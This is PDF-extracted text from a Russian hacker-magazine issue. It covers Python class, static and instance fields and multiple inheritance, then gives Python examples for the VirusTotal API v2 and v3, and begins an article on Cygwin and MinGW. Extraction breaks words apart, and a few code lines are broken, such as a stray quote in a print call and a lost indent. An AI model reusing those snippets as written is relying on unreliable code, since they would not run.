          print(self.x)


      def quux(self):
          print(self.x)


  >>> o = MyClass()
  >>> o.x = 30
  >>> o.foo()
  Traceback (most recent call last):
    File "<stdin>", line 1, in <module>
    File "<stdin>", line 5, in foo
  NameError: name 'x' is not defined
  >>> o.bar()
  10
  >>> o.quux()
  30

  С помощью o.x = 30 мы меня ем значение поля x в объ екте o. Как видишь,
  метод класса bar выводит исходное значение, потому что self для него —
  это сам класс MyClass. Для quux переменная self содержит ссыл ку именно
  на экземпляр o, поэтому метод выводит поле самого объ екта.
    Метод foo вовсе не работает, если во внешней области видимости нет
  переменной x. Если есть, то выводит ее. С помощью @staticmethod можно
  создать только такие методы, которым доступ к полям класса не нужен вооб‐
  ще, хотя зачем это может понадобить ся в язы ке с модулями и пространства‐
  ми имен — вопрос сложный.


 ИЗМЕНЯЕМОСТЬ ПОЛЕЙ КЛАССА
  В прошлом примере мы ввели поле класса x. В боль шинс тве случаев вся ини‐
  циализация переменных делается в методе __init__, вроде такого:


  class MyClass:
      def __init__(self):
          self.x = 10
          self.hello = "hello world"

  Почему так? Дело в том, что классы сами относятся к объ ектам клас са type
  и их поля так же изменяемы, как поля всех осталь ных объ ектов.


              INFO

                          Теперь ты знаешь,  как проверить,  что  поль‐
                          зователь передал имен но класс в твою абстрак‐
                         тную фабрику  абстрак тных фабрик  или еще
                          какую‐то функцию для создания объектов про‐
                          извольного класса. Совершенно верно, isin‐
                     stance(c, type).


  В момент создания объекты содержат ссылки на все поля и методы своего
  класса. Если кто‐то случайно модифицирует поле самого клас са (в стиле My‐
  Class.x = y), это автоматичес ки изменит поле x для всех уже созданных
  объектов этого класса.


  class MyClass:
      x = 10


  o = MyClass()


  >>> o.x
  10
  >>> MyClass.x = 70
  >>> o.x
  70

  Если кто‐то модифицирует поле в самом объекте, изменения в классе перес‐
  танут его затрагивать, поскольку поле потеря ет связь с клас сом и станет
  ссылкой на новое значение.


  >>> o.x = 80
  >>> MyClass.x = 100
  >>> o.x
  80

  Если инициализировать переменные в __init__, это будет происходить каж‐
  дый раз, когда кто‐то создает новый объект, и тог да эти переменные будут
  действительно локальными для конкретного объекта (instance variables).


 МНОЖЕСТВЕННОЕ НАСЛЕДОВАНИЕ
  Получить прямой доступ к информа ции о предках класса можно с помощью
  поля __bases__. В рабочем коде лучше так не делать, а обратиться к isin‐
  stance(), но ради интереса можно поп робовать.


  >>> import collections
  >>> collections.OrderedDict.__bases__
  (<class 'dict'>,)


  >>> dict.__bases__
  (<class 'object'>,)

  Ты видишь, там находится не одно зна чение, а кортеж (tuple), что намекает
  нам на возможность иметь более одного родителя. В Python на самом деле
  есть множественное наследование. Применять его или не применять — воп‐
  рос сложный (и в большинс тве проектов решенный в пользу «не применять»).
  При наличии удоб ного синтаксиса для декора торов можно добавить новое
  поведение в класс или метод куда проще.
    Тем не менее возможность есть и порядок поиска методов (method
  lookup) достаточно логичный: от первого ука занного пред ка к последнему.
    Для примера создадим два базовых клас са и двух потомков, которые нас‐
  ледуются от них в разном порядке:


  class Foo:
      def hello(self):
          print("hello world")


  class Bar:
      def hello(self):
          print("hi world")


  class Baz(Foo, Bar):
      pass


  class Quux(Bar, Foo):
      pass


  x = Baz()
  y = Quux()


  >>> x.hello()
  hello world
  >>> y.hello()
  hi world


  >> Baz.__bases__
  (<class '__main__.Foo'>, <class '__main__.Bar'>)
  >>> Quux.__bases__
  (<class '__main__.Bar'>, <class '__main__.Foo'>)

  То же самое относится к вызовам методов предка через super() — вызов
  отправится к первому предку в списке:


  class Xyzzy(Foo, Bar):
      def hello(self):
          super().hello()
  print("This is what my parent does")


  x = Xyzzy()


  >>> x.hello()
  hello world
  This is what my parent does


 ЗАКЛЮЧЕНИЕ
  Даже небольшие приложения будет проще поддерживать и расширять, если
  уделить внимание взаимоотношениям меж ду кодом и данными. Теперь ты
  знаешь детали поведения объектов — надеюсь, это тебе поможет.
КОДИНГ
  ТОТАЛЬНАЯ
  ПРОВЕРКА





     ИСПОЛЬЗУЕМ API VIRUSTOTAL
         В СВОИХ ПРОЕКТАХ




Ты наверняка не раз пользовался услугами
сайта   virustotal.com,  что бы  проверить,
не содержат ли бинарники вредоносных
функций, либо протестировать собствен‐
ные наработки. У этого сервиса есть бес‐         Евгений Дроботун                                                                                 Постоянный автор «Хакера»
платный API, работу с которым на Python мы
и разберем в этой статье.





                         Сайт virustotal.com

Чтобы пользоваться прог раммными интерфейсами VirusTotal без ограниче‐
ний, нужно получить ключ, который обходится в серьезную сумму — цены
начинаются с 700 евро в месяц. Причем час тно му лицу даже при готовности
платить ключ не дадут.
  Однако отчаиваться не стоит, поскольку основные функции сервис пре‐
доставляет бесплатно и огра ничивает нас лишь по числу запросов —
не более двух в минуту. Что ж, придется с этим мирить ся.


           WARNING

                         API VirusTotal нельзя использовать в коммерчес‐
                         ких продуктах или услугах и в проектах, которые
                        могут нанести прямой либо косвенный ущерб
                        антивирусной индустрии.



ПОЛУЧАЕМ API KEY
Итак, первым делом нам нуж на регистрация на сайте. Тут проблем никаких —
я уверен, что ты справишься. Пос ле регистрации берем ключ доступа, перей‐
дя в пункт меню API key.





              Вот здесь лежит ключ дос тупа к API VirusTotal


ВЕРСИИ API
Сейчас актуальная версия API имеет но мер 2. Но при этом уже сущес твует
и новый вариант — номер 3. Эта версия API пока еще находится в стадии
беты, но ее уже впол не можно использовать, тем более что возможности,
которые она пре доставляет, гораздо шире.
   Разработчики пока что рекомендуют применять третью версию только
для экспериментов либо для некритичных проектов. Мы же разберем обе
версии. Ключ доступа для них одинаков.


API VirusTotal. Версия 2
Как и в случае с другими популярными веб‐сервисами, работа с API заключа‐
ется в пересылке запросов по HTTP и получении ответов.
   API второй версии позволяет:
 • отправлять файлы на про верку;
 • получать отчет по проверенным ранее файлам, с использовани ем иден‐
   тификатора файла (хеш файла SHA‐256, SHA‐1 или MD5 либо значение
  scan_id из ответа, полученного пос ле отправки фай ла);
 • отправлять URL для ска нирования на сервер;
 • получать отчет по проверенным ранее адресам с использовани ем либо
   непосредственно URL, либо зна чения scan_id из ответа, полученного
   после отправки URL на сервер;
 • получать отчет по IP‐адресу;
 • получать отчет по доменному имени.


Ошиб ки
Если запрос был правиль но обра ботан и ошибок не возникло, будет возвра‐
щен код 200 (OK).
   Если же произошла ошиб ка, то могут быть такие варианты:
 • 204 — ошибка типа Request rate limit exceeded. Возникает, когда пре выше‐
   на квота допустимого количес тва запросов (для бесплатного ключа квота
   составляет четыре запроса в минуту);
 • 400 — ошибка типа Bad request. Возника ет, когда некорректно сфор‐
   мирован запрос, например если нет нужных аргументов или у них недопус‐
   тимые значения;
 • 403 — ошибка типа Forbidden. Воз ника ет, если пытаться использовать
  функции API, доступные только с платным ключом, когда его нет.

При правильном фор мирова нии запроса (код сос тояния HTTP — 200) ответ
будет представ лять собой объект JSON, в теле которого присутствуют
как минимум два поля:
 • response_code — если запрашиваемый объект (файл, URL, IP‐адрес
   или имя домена) есть в базе VirusTotal (то есть проверялся раньше)
   и информация об этом объекте может быть получе на, то значение этого
   поля будет равно единице; если запрашива емый объ ект находится в оче‐
   реди на анализ, зна чение поля будет 2 ; если запрашиваемый объект
   отсутствует в базе VirusTotal — равно нулю;
 • verbose_msg предос тавляет более подробное описание значения re
  sponse_code (например, Scan  ﬁnished,  information embedded после
   отправки файла на ска нирование).

Остальная информация, содержащаяся в ответном объ екте JSON, зависит
от того, какая фун кция API была использована.


Отправка файла на сервер для сканиро вания
Для отправки файла на ска ниро вание необходимо сформировать POST‐зап‐
рос на адрес https://www.virustotal.com/vtapi/v2, при этом в запросе
нужно указать ключ доступа к API и передать сам файл (здесь есть ограниче‐
ние на размер файла — не более 32 Мбайт). Это может выглядеть сле‐
дующим образом (используем Python):


import json
import requests
...
api_url = 'https://www.virustotal.com/vtapi/v2/file/scan'
params = dict(apikey='<ключ доступа>')
with open('<путь к файлу>', 'rb') as file:
  files = dict(file=('<путь к файлу>', file))
  response = requests.post(api_url, files=files, params=params)
if response.status_code == 200:
  result=response.json()
  print(json.dumps(result, sort_keys=False, indent=4))
...

Здесь вместо строки <ключ доступа> необ ходимо вставить свой ключ дос‐
тупа к API, а вместо <путь к файлу> — путь к файлу, который ты будешь
отправлять в VirusTotal. Если у тебя нет биб лиотеки requests, то пос тавь ее
командой pip install requests.
  В ответ, если все прош ло успешно и код сос тояния HTTP равен 200, мы
получим примерно вот такую картину:


{
  "response_code": 1,
  "verbose_msg": "Scan request successfully queued, come back later
for the report",
  "scan_id": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c45
38aabf651fd0f‐1577043276",
  "resource": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c45
38aabf651fd0f",
  "sha1": "3395856ce81f2b7382dee72602f798b642f14140",
  "md5": "44d88612fea8a8f36de82e1278abb02f",
  "sha256": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c45
38aabf651fd0f",
  "permalink": "https://www.virustotal.com/file/275a021bbfb6489
e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f/analysis/157704
3276/"
}

Здесь мы видим значения response_code и verbose_msg, а также хеши фай‐
ла SHA‐256, SHA‐1 и MD5, ссылку на результаты ска нирования файла на сай‐
те permalink и идентификатор файла scan_id.


             INFO

                   В приведенных в статье примерах кода опущена
                      обработка ошибок. Помни, что в ходе открытия
                    файла или отправки зап росов на сервер могут
                       возникать исключения: FileNotFoundError,
                       если      файла        нет,     requests.
                   ConnectionError,     requests.Timeout
                      при ошибках соединения и так далее.



По луче ние отче та о последнем сканиро вании файла
Используя какой‐либо из хешей или зна чение scan_id из отве та, можно
получить отчет по последнему ска ниро ванию файла (если файл уже загружал‐
ся на VirusTotal). Для это го нужно сформировать GET‐запрос и в запросе ука‐
зать ключ доступа и идентификатор файла. Нап ример, если у нас есть
scan_id из предыдущего примера, то запрос будет выглядеть так:


import json
import requests
...
api_url = 'https://www.virustotal.com/vtapi/v2/file/report'
params = dict(apikey='<ключ доступа>', resource='275a021bbfb6489
e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f‐1577043276')
response = requests.get(api_url, params=params)
if response.status_code == 200:
  result=response.json()
  print(json.dumps(result, sort_keys=False, indent=4))
...

В случае успеха в ответ мы увидим следующее:


{
  "response_code": 1,
  "verbose_msg": "Scan finished, information embedded",
  "resource": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c45
38aabf651fd0f",
  "sha1": "3395856ce81f2b7382dee72602f798b642f14140",
  "md5": "44d88612fea8a8f36de82e1278abb02f",
  "sha256": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c45
38aabf651fd0f",
  "scan_date": "2019‐11‐27 08:06:03",
  "permalink": "https://www.virustotal.com/file/275a021bbfb6489
e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f/analysis/157704
3276/",
  "positives": 59,
  "total": 69,
  "scans": {
    "Bkav": {
      "detected": true,
      "version": "1.3.0.9899",
      "result": "DOS.EiracA.Trojan",
      "update": "20191220"
    },
    "DrWeb": {
      "detected": true,
      "version": "7.0.42.9300",
      "result": "EICAR Test File (NOT a Virus!)",
       "update": "20191222"
    },
    "MicroWorld‐eScan": {
      "detected": true,
      "version": "14.0.297.0",
      "result": "EICAR‐Test‐File",
      "update": "20191222"
    },
    ...
  ...
  "Panda": {
    "detected": true,
    "version": "4.6.4.2",
    "result": "EICAR‐AV‐TEST‐FILE",
    "update": "20191222"
  },
  "Qihoo‐360": {
    "detected": true,
    "version": "1.0.0.1120",
    "result": "qex.eicar.gen.gen",
    "update": "20191222"
  }
}

Здесь, как и в пер вом примере, получаем значения хешей файла, scan_id,
permalink, значения response_code и verbose_msg. Также видим результаты
сканирования файла антивиру сами и общие результаты оценки total —
сколько все го антивирусных движков было задействовано в проверке и posi‐
tives — сколько антивиру сов дали положительный вердикт.
   Чтобы вывести результаты сканирования всеми антивирусами в удобова‐
римом виде, можно, например, написать что‐то в таком роде:


import requests
...
api_url = 'https://www.virustotal.com/vtapi/v2/file/report'
params = dict(apikey='<ключ доступа>', resource='275a021bbfb6489
e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f‐1577043276')
response = requests.get(api_url, params=params)
if response.status_code == 200:
  result=response.json()
  for key in result['scans']:
    print(key)
    print('  Detected: ', result['scans'][key]['detected'])
    print('  Version: ', result['scans'][key]['version'])
    print('  Update: ', result['scans'][key]['update'])
    print('  Result: ', 'result['scans'][key]['result'])
...





  Вывод на экран информации о результатах сканирования файла на Virus‐
   Total с использованием разных антивирус ных движков


Отправка URL на сервер для сканиро вания
Чтобы отправить URL для сканирования, нам необ ходимо сформировать
и послать POST‐запрос, содержащий ключ доступа и сам URL:


import json
import requests
...
api_url = 'https://www.virustotal.com/vtapi/v2/url/scan'
params = dict(apikey='<ключ доступа>', url='https://xakep.ru/author/
drobotun/')
response = requests.post(api_url, data=params)
if response.status_code == 200:
  result=response.json()
  print(json.dumps(result, sort_keys=False, indent=4))
...

В ответ мы получим примерно то же, что и при отправке файла, за исключени‐
ем  значений  хеша.  Содержимое  поля  scan_id можно  использовать
для получения отчета о ска ниро вании данного URL.


По луче ние отче та о результатах сканиро вания URL-адре са
Сформируем GET‐запрос с ключом доступа и укажем либо непосредственно
сам URL в виде строки, либо значение scan_id, полученное с помощью пре‐
дыдущей функции. Это будет выглядеть следующим образом:


import json
import requests
...
api_url = 'https://www.virustotal.com/vtapi/v2/url/report'
params = dict(apikey='<ключ доступа>', resource='https://xakep.ru/
author/drobotun/', scan=0)
response = requests.get(api_url, params=params)
if response.status_code == 200:
  result=response.json()
  print(json.dumps(result, sort_keys=False, indent=4))
...

Помимо ключа доступа и строки с URL, здесь присутству ет опциональный
параметр scan — по умолчанию он равен нулю. Если же его значение равно
единице, то, когда информа ции о запрашива емом URL в базе VirusTotal нет
(URL ранее не проверялся), этот URL будет авто матичес ки отправлен на сер‐
вер для провер ки, после чего в ответ мы получим ту же информацию, что
и при отправ ке URL на сервер. Если этот параметр равен нулю (или
не задавался), мы получим отчет об этом URL либо (если информация о нем
в базе VirusTotal отсутству ет) ответ такого вида:


{
  "response_code": 0,
  "resource": "<запрашиваемый URL>",
  "verbose_msg": "Resource does not exist in the dataset"
}


По луче ние информации об IP-адре сах и доменах
Чтобы проверить IP‐адреса и домены, нужно сформировать и отправить GET‐
запрос с клю чом, именем проверяемого домена либо IP в виде строки.
Для проверки домена это выг лядит так:


...
api_url = 'https://www.virustotal.com/vtapi/v2/domain/report'
params = dict(apikey='<ключ доступа>', domain=<'имя домена'>)
response = requests.get(api_url, params=params)
...

Для проверки IP‐адреса:


...
api_url = 'https://www.virustotal.com/vtapi/v2/ip‐address/report'
params = dict(apikey='<ключ доступа>', ip=<'IP‐адрес'>)
response = requests.get(api_url, params=params)
...

Ответы на такие запросы объемны и содержат много информации. Нап‐
ример, для IP 178.248.232.27 (это IP «Хакера») начало отчета, полученного
с сервера VirusTotal, выглядит так:


{
  "country": "RU",
  "response_code": 1,
  "as_owner": "HLL LLC",
  "verbose_msg": "IP address in dataset",
  "continent": "EU",
  "detected_urls": [
    {
    "url": "https://xakep.ru/author/drobotun/",
    "positives": 1,
    "total": 72,
    "scan_date": "2019‐12‐18 19:45:02"
    },
    {
    "url": "https://xakep.ru/2019/12/18/linux‐backup/",
    "positives": 1,
    "total": 72,
    "scan_date": "2019‐12‐18 16:35:25"
    },
    ...
  ]
}




                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ
ТОТАЛЬНАЯ ПРОВЕРКА
              ИСПОЛЬЗУЕМ API VIRUSTOTAL В СВОИХ
                                     ПРОЕКТАХ





API VirusTotal. Версия 3
В третьей версии API намного больше воз можнос тей по сравнению со вто‐
рой — даже с исполь зованием бес платного клю ча. Более того, при экспе‐
риментах с третьей версией я не заметил, чтобы ограничивалось чис ло заг‐
ружаемых объектов (файлов или адресов) на сервер в течение минуты.
Похоже, ограниче ния в бете пока вооб ще не дей ству ют.
  Функции третьей версии API спроекти рова ны с использованием прин‐
ципов REST и просты для понима ния. Ключ дос тупа здесь передается
в заголовке запроса.


Ошиб ки
В третьей версии API список ошибок (и, соответс твенно, кодов состояния
HTTP) расширился. Были добавлены:
 • 401 — ошибка типа User Not Active Error, она возникает, когда учетная
   запись пользователя неактивна;
 • 401 — ошибка типа Wrong Credentials Error, воз никает, если в запросе
   использован неверный ключ дос тупа;
 • 404 Not Found Error воз никает, когда зап рашиваемый объ ект анализа
   не найден;
 • 409 — ошибка типа Already Exists Error, воз никает, когда ресурс уже сущес‐
   твует;
 • 429 — ошибка типа Quota Exceeded Error, возникает при превыше нии
   одной из квот на число запросов (минутной, ежедневной или еже месяч‐
   ной). Как я уже говорил, во время моих экспериментов никаких ограниче‐
   ний по количеству зап росов в минуту не наб людалось, хотя я использовал
   бесплатный ключ;
 • 429 — ошибка типа Too Many Requests Error, возникает при большом числе
   запросов за короткое время (может быть выз вана загруженностью сер‐
   вера);
 • 503 — ошибка  типа  Transient  Error,  временная ошибка  сервера,
   при которой повторная попытка запроса может сработать.

В случае ошибки, помимо кода состояния, сервер возвращает дополнитель‐
ную информацию в форме JSON. Правда, как выяс нилось, не для всех кодов
состояния HTTP: к примеру, для ошиб ки 404 дополнительная информация
представ ляет собой обычную строку.
  Формат JSON для ошибки следующий:


{
  "error": {
    "code": "<код состояния HTTP>",
    "message": "<сообщение с описанием ошибки>"
  }
}


Фун кции работы с файлами
Третья версия API позволяет:
 • загрузить файлы для анализа на сервер;
 • получить URL для загрузки на сервер файла раз мером больше 32 Мбайт;
 • получить отче ты о результатах анализа фай лов;
 • повторно проанализировать файл;
 • получить ком ментарии пользователей VirusTotal к нужному файлу;
 • отправить свой комментарий к определен ному файлу;
 • посмотреть результаты голосования по определенному файлу;
 • проголосовать за файл;
 • получить расширенную информа цию о файле.

Для загрузки файла на сервер нужно его отпра вить через POST‐запрос.
Это можно сде лать так:


...
api_url = 'https://www.virustotal.com/api/v3/files'
headers = {'x‐apikey' : '<ключ доступа к API>'}
with open('<путь к файлу>', 'rb') as file:
  files = {'file': ('<путь к файлу>', file)}
  response = requests.post(api_url, headers=headers, files=files)
...

В ответ мы получим следующее:


{
  "data": {
    "id": "ZTRiNjgxZmJmZmRkZTNlM2YyODlkMzk5MTZhZjYwNDI6MTU3NzI
xOTQ1Mg==",
    "type": "analysis"
  }
}

Здесь мы видим значение id, которое служит идентификатором файла. Этот
идентификатор нужно использовать для получения информации об анализе
файла в GET‐запросах типа /analyses (об этом мы поговорим чуть позже).
   Чтобы получить URL для загрузки большого фай ла (более 32 Мбайт), нуж‐
но отправить GET‐запрос, в котором в качестве URL указывается https://
www.virustotal.com/api/v3/files/upload_url. В  заголовок  вставляем
ключ доступа:


...
api_url = 'https://www.virustotal.com/api/v3/files/upload_url'
headers = {'x‐apikey' : '<ключ доступа к API>'}
response = requests.get(api_url, headers=headers)
...

В ответ получим JSON с адресом, по которому следует загрузить файл
для анализа. Полученный URL при этом можно исполь зовать только один раз.
   Чтобы получить информацию о файле, который сервис уже анализировал,
нужно сделать GET‐запрос с идентификатором файла в URL (им может быть
хеш SHA‐256, SHA‐1 или MD5). Так же как и в предыдущих случаях, указываем
в заголовке ключ доступа:


...
api_url = 'https://www.virustotal.com/api/v3/files/<значение
идентификатора файла>'
headers = {'x‐apikey' : '<ключ доступа к API>'}
response = requests.get(api_url, headers=headers)
...

В ответ мы получим отчет о про верке файла, где, помимо результатов ска‐
нирования все ми антивиру сами  VirusTotal, будет много допол нительной
информации, состав которой зависит от типа проверенного фай ла. Нап‐
ример, для исполняемых файлов можно увидеть информацию о таких атри‐
бутах:


{
  "attributes": {
    "authentihash": "8fcc2f670a166ea78ca239375ed312055c74efdc1f
47e79d69966461dd1b2fb6",
    "creation_date": 1270596357,
    "exiftool": {
      "CharacterSet": "Unicode",
      "CodeSize": 20480,
      "CompanyName": "TYV",
      "EntryPoint": "0x109c",
      "FileFlagsMask": "0x0000",
      "FileOS": "Win32",
      "FileSubtype": 0,
      "FileType": "Win32 EXE",
      "FileTypeExtension": "exe",
      "FileVersion": 1.0,
      "FileVersionNumber": "1.0.0.0",
      "ImageFileCharacteristics": "No relocs, Executable, No line
numbers, No symbols, 32‐bit",
      ...
      ...
      "SubsystemVersion": 4.0,
      "TimeStamp": "2010:04:07 00:25:57+01:00",
      "UninitializedDataSize": 0
    },
    ...
  }
}

Или, например, информацию о секциях исполня емого фай ла:


{
  "sections": [
    {
      "entropy": 3.94,
      "md5": "681b80f1ee0eb1531df11c6ae115d711",
      "name": ".text",
      "raw_size": 20480,
      "virtual_address": 4096,
      "virtual_size": 16588
    },
    {
      "entropy": 0.0,
      "md5": "d41d8cd98f00b204e9800998ecf8427e",
      "name": ".data",
      "raw_size": 0,
      "virtual_address": 24576,
      "virtual_size": 2640
    },
    ...
  }
}

Если файл ранее не загружался на сервер и еще не анализировал ся, то
в ответ мы получим ошибку типа Not Found Error с HTTP‐кодом состояния,
равным 404:


{
  "error": {
    "code": "NotFoundError",
    "message": "File \"<идентификатор файла>" not found"
  }
}

Чтобы повторно проанализировать файл, нужно также отправить на сервер
GET‐запрос, в котором в URL помещаем идентификатор фай ла, а в конце
добавляем /analyse:


...
api_url = 'https://www.virustotal.com/api/v3/files/<значение
идентификатора файла>/analyse'
headers = {'x‐apikey' : '<ключ доступа к API>'}
response = requests.get(api_url, headers=headers)
...

Ответ будет включать в себя такой же дескриптор фай ла, как и в первом слу‐
чае — при загрузке файла на сервер. И так же, как и в первом слу чае, иден‐
тификатор из дескриптора мож но использовать для получения информации
об анализе файла через GET‐запрос типа /analyses.
  Просмотреть коммента рии пользователей сервиса, а также результаты
голосования по файлу можно, отпра вив на сервер соответству ющий GET‐
запрос. Для получения коммента риев:


...
api_url = 'https://www.virustotal.com/api/v3/files/<значение
идентификатора файла>/comments'
headers = {'x‐apikey' : '<ключ доступа к API>'}
response = requests.get(api_url, headers=headers)
...

Для получения результатов голосования:


...
api_url = 'https://www.virustotal.com/api/v3/files/<значение
идентификатора файла>/votes'
headers = {'x‐apikey' : '<ключ доступа к API>'}
response = requests.get(api_url, headers=headers)
...

В обоих случаях можно использовать дополнительный параметр limit, опре‐
деляющий максимальное количество коммента риев или голосов в ответе
на запрос. Исполь зовать этот параметр мож но, например, так:


...
limit = {'limit': str(<число голосов в ответе>)}
api_url = 'https://www.virustotal.com/api/v3/files/<значение
идентификатора файла>/votes'
headers = {'x‐apikey' : '<ключ доступа к API>'}
response = requests.get(api_url, headers=headers, params=limit)
...

Чтобы разместить свой комментарий или про голосовать за файл, создаем
POST‐запрос, а комментарий или голос передаем как объ ект JSON:


...
# Для отправки результатов голосования
votes = {'data': {'type': 'vote', 'attributes': {'verdict': <'malici
ous' или 'harmless'>}}}
api_url = 'https://www.virustotal.com/api/v3/files/<значение
идентификатора файла>/votes'
headers = {'x‐apikey' : '<ключ доступа к API>'}
response = requests.post(api_url, headers=headers, json=votes)
...
# Для отправки комментария
comments = {'data': {'type': 'vote', 'attributes': {'text': <текст
комментария>}}}
headers = {'x‐apikey' : '<ключ доступа к API>'}
api_url = 'https://www.virustotal.com/api/v3/files/<значение
идентификатора файла>/comments'
response = requests.post(api_url, headers=headers, json=comments)
...

Чтобы получить допол нительную информа цию о файле, можно запросить
подробности о связанных с ним объектах. В данном случае объ екты могут
характеризовать, например, поведение фай ла (объект behaviours) или URL,
IP‐адреса, доменные имена (объекты contacted_urls, contacted_ips, con‐
tacted_domains).
  Интереснее всего объ ект behaviours. К примеру, для исполняемых фай‐
лов он будет включать в себя информацию о загружаемых модулях, создава‐
емых и запускаемых процессах, операциях с фай ловой сис темой и реес тром,
сетевых операциях.
   Чтобы получить эту информа цию, отправляем GET‐запрос:


api_url = 'https://www.virustotal.com/api/v3/files/<значение
идентификатора файла>/behaviours'
headers = {'x‐apikey' : '<ключ доступа к API>'}
response = requests.get(api_url, headers=headers)

В ответе будет объект JSON с информа цией о поведении фай ла:


{
  "data": [
    {
      "attributes": {
        "analysis_date": 1548112224,
        "command_executions": [
          "C:\\WINDOWS\\system32\\ntvdm.exe ‐f ‐i1",
          "/bin/bash /private/tmp/eicar.com.sh"
        ],
        "has_html_report": false,
        "has_pcap": false,
        "last_modification_date": 1577880343,
        "modules_loaded": [
          "c:\\windows\\system32\\user32.dll",
          "c:\\windows\\system32\\imm32.dll",
          "c:\\windows\\system32\\ntdll.dll"
        ]
      },
      ...
    }
  ]
}


Фун кции для работы с URL
В список возможных операций с URL входят:
 • отправка URL на сервер для анализа;
 • получение информации об URL;
 • анализ URL;
 • получение коммента риев пользователей VirusTotal по нужному URL;
 • отправка своих коммента риев по определен ному URL;
 • получение результатов голосо вания по определенному URL;
 • отправка своего голоса за какой‐либо URL;
 • получение расширенной информации о URL;
 • получение информации о домене или IP‐адресе нужного URL.

Большая часть указанных операций (за исключением последней) выполняет‐
ся аналогично таким же операциям с файлами. При этом в качестве иден‐
тификатора URL могут выступать либо строка с URL, закодированная
в Base64 без добавоч ных зна ков «равно», либо хеш SHA‐256 от URL. Реали‐
зовать это можно так:


# Для Base64
import base64
...
id_url = base64.urlsafe_b64encode(url.encode('utf‐8')).decode('utf‐8'
).rstrip('=')
...
# Для SHA‐256
import hashlib
...
id_url = hashlib.sha256(url.encode()).hexdigest()

Чтобы отправить URL для анализа, нужно исполь зовать POST‐запрос:


data = {'url': '<строка с именем URL>'}
api_url = 'https://www.virustotal.com/api/v3/urls'
headers = {'x‐apikey' : '<ключ доступа к API>'}
response = requests.post(api_url, headers=headers, data=data)

В ответ мы увидим дескриптор URL (по ана логии с дескриптором файла):


{
  "data": {
    "id": "u‐1a565d28f8412c3e4b65ec8267ff8e77eb00a2c76367e653be7
74169ca9d09a6‐1577904977",
    "type": "analysis"
  }
}

Идентификатор  id  из  это го  дескриптора  используем  для  получения
информации об анализе файла через GET‐запрос типа /analyses (об этом
запросе ближе к концу статьи).
  Получить информацию о доменах или IP‐адресах, свя занных с каким‐либо
URL, можно, применив GET‐запрос типа /network_location (здесь исполь‐
зуем Base64 или SHA‐256 идентифика тор URL):


api_url = 'https://www.virustotal.com/api/v3/urls/<идентификатор
URL (Base64 или SHA‐256)>/network_location'
headers = {'x‐apikey' : '<ключ доступа к API>'}
response = requests.post(api_url, headers=headers)

Остальные операции с URL выполняют ся так же, как и аналогичные опе рации
работы с файлами.


Фун кции работы с доменами и IP-адре сами
Этот список функций включает в себя:
 • получение информации о домене или IP‐адресе;
 • получение комментариев пользователей  VirusTotal по нужному домену
   или IP‐адресу;
 • отправку своих комментариев по определен ному домену или IP‐адресу;
 • получение результатов голосования по определенному домену или IP‐
   адресу;
 • отправку голоса за домен или IP‐адрес;
 • получение расширенной информации о домене или IP‐адресе.

Все эти операции реализуются ана логично таким же опе рациям с файлами
либо с URL. Отличие в том, что здесь используют ся непосредственно име на
доменов или значения IP‐адресов, а не их идентификаторы.
  Например, получить информа цию о домене www.xakep.ru можно таким
образом:


api_url = 'https://www.virustotal.com/api/v3/domains/www.xakep.ru'
headers = {'x‐apikey' : '<ключ доступа к API>'}
response = requests.get(api_url, headers=headers)

А, к примеру, посмотреть комментарии по IP‐адресу 178.248.232.27 — вот
так:


api_url = 'https://www.virustotal.com/api/v3/ip_addresses/178.248.
232.27/comments'
headers = {'x‐apikey' : '<ключ доступа к API>'}
response = requests.get(api_url, headers=headers)


GET-запрос типа /analyses
Такой запрос позволяет получить информацию о результатах анализа файлов
или URL после их загрузки на сервер или пос ле повторного анализа.
При этом необходимо использовать идентифика тор, содержащийся в поле id
дескриптора файла, или URL, полученные в результате отправки запросов
на загрузку файла или URL на сервер либо в результате повторного анализа
файла или URL.
  Например, сфор мировать подобный запрос для файла можно вот так:


TEST_FILE_ID = 'ZTRiNjgxZmJmZmRkZTNlM2YyODlkMzk5MTZhZjYwNDI6MTU3NjY
wMTE1Ng=='
...
api_url = 'https://www.virustotal.com/api/v3//analyses/' + TEST_F
ILE_ID
headers = {'x‐apikey' : '<ключ доступа к API>'}
response = requests.get(api_url, headers=headers)

И вариант для URL:


TEST_URL_ID = 'u‐dce9e8fbe86b145e18f9dcd4aba6bba9959fdff55447a8f9914
eb9c4fc1931f9‐1576610003'
...
api_url = 'https://www.virustotal.com/api/v3//analyses/' + TEST_U
RL_ID
headers = {'x‐apikey' : '<ключ доступа к API>'}
response = requests.get(api_url, headers=headers)


ЗАКЛЮЧЕНИЕ
Мы прошлись по всем основным функциям API сервиса VirusTotal. Ты можешь
позаимствовать приведен ный код для своих про ектов. Если используешь вто‐
рую версию, понадобится следить за тем, что бы не отправлять запросы
слишком часто, но в треть ей версии такого ограниче ния пока что нет.
Рекомендую выбрать имен но ее, пос кольку и воз можности здесь тоже нам‐
ного шире. К тому же рано или поздно она станет основной.


        WWW

                    •Подробное описание второй версии API
                     •Справка по API v3
                    •Исходники из статьи для вто рой версии API
                    •Вариант примеров для третьей версии
КОДИНГ
CYGWIN ИЛИ
  MINGW?





  СОБИРАЕМ ПРОГРАММЫ ДЛЯ WINDOWS
      БЕЗ WINDOWS





Большая часть разработчиков свободного
софта работает на Linux или Mac, а вот под‐
держка  Windows  обычно  реализована
по остаточному принципу. Заработало —
хорошо, не заработало — пускай портирует         Даниил Батурин                                                                                   Координатор проекта VyOS
тот, кому это нужно. Я покажу, как соз давать        (https://vyos.io),функциональщик,«языковед»,иногда
нативные исполняемые файлы для  Win‐         сетевойdaniil@baturin.orgадминистратор
dows, не имея этой системы под рукой.


В общем‐то, даже в Microsoft уже признали проб лему и сделали WSL (Win‐
dows Subsystem for Linux), чтобы запус кать те приложения, у которых нативных
версий под Windows нет. Одна ко если ты хочешь сделать свою программу
доступной для широкой аудитории, то WSL вовсе не панацея, поскольку
